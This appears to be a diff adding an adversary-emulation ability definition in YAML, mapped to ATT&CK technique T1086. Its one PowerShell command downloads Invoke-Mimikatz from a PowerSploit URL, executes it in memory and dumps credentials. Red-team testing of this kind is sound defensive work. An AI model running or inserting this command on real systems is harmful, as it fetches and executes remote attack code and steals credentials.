@@ -1,0 +1,14 @@
+---
+
+- id: tacexecu-1086-AR00-1v00-200120184608
+  name: Mimikatz
+  description: .      Download Mimikatz and dump credentials.  
+  tactic: execution
+  technique:
+    attack_id: T1086
+    name: PowerShell
+  platforms:
+    windows:
+      cmd:
+        command: |
+          powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds"
